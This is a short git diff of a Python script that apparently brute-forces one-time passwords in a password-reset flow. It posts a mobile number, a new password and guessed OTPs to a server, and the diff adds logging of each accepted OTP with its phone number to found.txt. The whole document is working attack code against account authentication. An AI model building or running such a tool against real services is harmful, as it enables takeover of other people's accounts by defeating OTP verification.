@@ -15,10 +15,13 @@ def check_otp(mobile, passw, userotp):
     response = requests.post(url, data=payload, headers=headers, cookies={})
 
 
-    if 'invalid otp' in response.text.lower():
+    if "Invalid OTP" in response.text:
         pass
     else:
         print(f'{userotp}: OTP found')
+        with open('found.txt', 'a') as file:
+            file.write(f'{userotp}: {mobile}\n')
+       
 
 mobile = input("Enter mobile number: ")
 passw = input("Enter the new password: ")
